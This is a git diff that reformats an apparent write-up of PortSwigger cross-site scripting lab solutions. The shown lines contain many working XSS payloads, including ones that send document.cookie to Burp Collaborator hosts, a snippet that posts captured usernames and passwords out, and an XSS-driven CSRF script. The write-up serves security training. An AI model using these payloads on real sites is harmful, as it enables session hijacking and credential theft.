@@ -106,9 +106,8 @@ for(var i=0;i<stores.length;i++) {
     document.write('<option>'+stores[i]+'</option>');
 }
 document.write('</select>');
-![image](https://github.com/user-attachments/assets/0a738097-6c16-4cde-9bd4-73c752f5f911)
-
 ```
+![image](https://github.com/user-attachments/assets/0a738097-6c16-4cde-9bd4-73c752f5f911)
 
 ![image](https://github.com/user-attachments/assets/57262be2-32e1-4751-a2cc-fc9137427cab)
 
@@ -119,10 +118,8 @@ The parameter storeId is written between "" and "". That means if we add that va
 To escape the option tags we can use the payload:
 
 ```
-
 </option><script>alert(1)</script><option selected>
 /product?productId=4&storeId=</option><script>alert(1)</script><option%20selected>
-
 ```
 ![image](https://github.com/user-attachments/assets/4c9f4987-1e7a-4673-b67c-a5ea6c764e6c)
 
@@ -149,14 +146,17 @@ The string is part of a h1 tag:
 
 Using curly-braces we find this payload is interpreted:
 
-`{{1== 1 ? "Yes, it is equal" : "No, it is not"}}`
+```
+{{1== 1 ? "Yes, it is equal" : "No, it is not"}}
+```
 
 ![image](https://github.com/user-attachments/assets/36eddae7-e2dd-4ed2-8123-233c02fd4c25)
 
 
 I could pop an alert with the example from  https://stackoverflow.com/questions/66759842/what-does-object-constructor-constructoralert1-actually-do-in-javascript:
-
-`{{constructor.constructor('alert(1)')()}}`
+```
+{{constructor.constructor('alert(1)')()}}
+```
  
 ![image](https://github.com/user-attachments/assets/c4a58ef1-6b98-43bd-81e9-f23839c74271)
 
@@ -197,7 +197,9 @@ The correct payload from the solution:
 
 • Server adds \ to " so " becomes "".
 • } closes the JSON object
-// comments the rest of the object![image](https://github.com/user-attachments/assets/59d5fb11-e5a4-496f-92c9-529a25d42174)
+// comments the rest of the object
+
+![image](https://github.com/user-attachments/assets/59d5fb11-e5a4-496f-92c9-529a25d42174)
 
 ![image](https://github.com/user-attachments/assets/7f653866-278b-46db-98c7-7e13200dbcdb)
 
@@ -475,6 +477,8 @@ In this case it seems not even custom tags are allowed. I will test all possible
 	• animatetransform
 	• image
 	• title
+
+	
  <img width="694" height="155" alt="image" src="https://github.com/user-attachments/assets/0f1b231d-1f68-45ef-8dd4-efccff6cd015" />
 
 
@@ -490,9 +494,7 @@ We get this payload from  https://portswigger.net/web-security/cross-site-script
 <img width="1292" height="175" alt="image" src="https://github.com/user-attachments/assets/9c996b2c-975a-4adc-9a64-92b9228a7c03" />
 
 ```
-
 <svg><animatetransform onbegin=alert(1) attributeName=transform>
-
 ```
 
 <img width="784" height="162" alt="image" src="https://github.com/user-attachments/assets/43832b6f-4790-4ad0-9c9b-d2d6f037996f" />
@@ -538,7 +540,9 @@ In the **/post** endpoint it is necessary to send a correct postId, but it is po
 
 A correct payload:
 
-`/post?postId=1&a=b'accesskey='X'onclick='alert(1)`
+```
+/post?postId=1&a=b'accesskey='X'onclick='alert(1)
+```
 
 <img width="705" height="276" alt="image" src="https://github.com/user-attachments/assets/f10213e7-bf97-49b2-8d7f-7a064292c160" />
 
@@ -564,9 +568,10 @@ A correct payload:
   
   ```
   ';</script><img src=x onerror=alert(1)><script>var a='a
-
   ```
+
 <img width="832" height="129" alt="image" src="https://github.com/user-attachments/assets/5e7910b5-831a-4530-bc26-8267a0b4b08e" />
+
 <img width="963" height="97" alt="image" src="https://github.com/user-attachments/assets/3a017ab9-da7a-4128-9aae-f0085ca29b0f" />
 
 ---
@@ -591,8 +596,7 @@ A payload that works is:
 
 ```
  \';alert(1);//
-
- ```
+```
 <img width="870" height="143" alt="image" src="https://github.com/user-attachments/assets/cb9555c3-c198-4385-870e-cc29b23149e9" />
 
 
@@ -615,8 +619,9 @@ There is a function to post comments:
 It generates the following HTML code:
 
 <img width="1148" height="77" alt="image" src="https://github.com/user-attachments/assets/202a5b88-3d46-4d02-b643-b1bfb5c133a5" />
-
-`a id="author" href="http://test4.com" onclick="var tracker={track(){}};tracker.track('http://test4.com');">test2</a>`
+```
+a id="author" href="http://test4.com" onclick="var tracker={track(){}};tracker.track('http://test4.com');">test2</a>
+```
 
 We see single quote and backslash characters are indeed escaped and angle brackets and double quotes are HTML-encoded:
 
@@ -625,7 +630,9 @@ We see single quote and backslash characters are indeed escaped and angle bracke
 
 We will use “'” next:
 
-`http://test4.com&apos;);alert(1);//`
+```
+http://test4.com&apos;);alert(1);//
+```
 
 ```
 POST /post/comment HTTP/2
@@ -674,17 +681,20 @@ ${alert(1)}
 ### Solution
 First we test the XSS in one of the blog posts. This payload works:
 
-`</p><img src=x onerror=alert(1) /><p>`
+```
+</p><img src=x onerror=alert(1) /><p>
+```
 
 <img width="789" height="631" alt="image" src="https://github.com/user-attachments/assets/301650af-27a2-4d98-ba54-16ba054fc1ab" />
 
 Next we try the payload:
 
-`'document.location="http://s2v2in38mu6tj6w733goro9f066xunic.oastify.com/?cookies="+document.cookie'`
+```
+document.location="http://s2v2in38mu6tj6w733goro9f066xunic.oastify.com/?cookies="+document.cookie
+```
 
 ```
 </p><img src=x onerror='document.location="http://s2v2in38mu6tj6w733goro9f066xunic.oastify.com/?cookies="+document.cookie' /><p>
-
 ```
 
 We receive cookies in Burp Collaborator:
@@ -713,30 +723,28 @@ Then intercept the request to the Home page and add these cookies and we are aut
   We test the most simple XSS payload on comments:
 
 
-    <img width="816" height="646" alt="image" src="https://github.com/user-attachments/assets/48627d45-caa8-448f-be62-24f874bea3f5" />
+<img width="816" height="646" alt="image" src="https://github.com/user-attachments/assets/48627d45-caa8-448f-be62-24f874bea3f5" />
 
    It gets executed:
 
    Next we test a payload from  `https://github.com/R0B1NL1N/WebHacking101/blob/master/xss-reflected-steal-cookie.md`:
 
-    ```
-    
-    <script>var i=new Image;i.src="http://ecu0uhyerytdj8d8vdyuowv8zz5qtlha.oastify.com/?cookie="+document.cookie;</script>
+```    
+<script>var i=new Image;i.src="http://ecu0uhyerytdj8d8vdyuowv8zz5qtlha.oastify.com/?cookie="+document.cookie;</script>
+Or 
 
-    Or
- 
-   <img src=x onerror="this.src='http://ecu0uhyerytdj8d8vdyuowv8zz5qtlha.oastify.com/?cookie='+document.cookie; this.removeAttribute('onerror');">
+<img src=x onerror="this.src='http://ecu0uhyerytdj8d8vdyuowv8zz5qtlha.oastify.com/?cookie='+document.cookie; this.removeAttribute('onerror');">
+```
 
-    
-       ```
 <img width="722" height="615" alt="image" src="https://github.com/user-attachments/assets/bc35d05a-8ecf-4c66-8d06-a66fc022a104" />
 
  We get an HTTP request with the cookie:
 
 
  Next I opened the Firefox debugger's Console and set the cookie:
-
- `document.cookie="secret=5yN1hPLMMamjE1mFPVb7ocKMq7BSYyTK"`
+```
+ document.cookie="secret=5yN1hPLMMamjE1mFPVb7ocKMq7BSYyTK"
+```
 
 <img width="483" height="121" alt="image" src="https://github.com/user-attachments/assets/d394799d-24f9-4ad3-b738-694d743adc6b" />
 
@@ -751,7 +759,6 @@ method:'POST',
 mode: 'no-cors',
 body:username.value+':'+this.value
 });">
-
 ```
 
 <img width="775" height="639" alt="image" src="https://github.com/user-attachments/assets/7cbb1978-9829-4493-8da3-87bf3d687091" />
@@ -811,7 +818,6 @@ You can also escalate the attack by submitting the following **XSS-based CSRF** 
 Now Stored below comment in blog then lab will be marked ad solve
 
 ```
-
 <script>
     // Wait the window is fully loaded, otherwise the CSRF token will be empty
     window.onload = function (){
@@ -833,7 +839,6 @@ Now Stored below comment in blog then lab will be marked ad solve
         )
     };
 </script>
-
 ```
 
 <img width="776" height="897" alt="image" src="https://github.com/user-attachments/assets/e3c2e5eb-935a-48c0-ad3b-0cf85eeffb04" />
@@ -842,4 +847,5 @@ Now Stored below comment in blog then lab will be marked ad solve
 <img width="1163" height="248" alt="image" src="https://github.com/user-attachments/assets/20f10f05-d180-4bc6-872e-bddbf3c7e425" />
 
 ---
+
 
